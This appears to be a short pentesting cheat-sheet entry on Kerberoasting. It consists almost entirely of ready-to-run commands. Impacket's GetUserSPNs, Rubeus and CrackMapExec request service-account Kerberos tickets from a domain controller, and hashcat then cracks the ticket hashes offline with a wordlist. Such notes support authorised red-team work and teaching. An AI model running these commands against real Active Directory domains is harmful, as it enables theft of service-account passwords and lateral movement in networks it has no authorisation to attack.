# Kerberoasting

Extract service account TGS tickets and crack offline:

```bash
# Impacket
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# CrackMapExec
crackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt rockyou.txt
```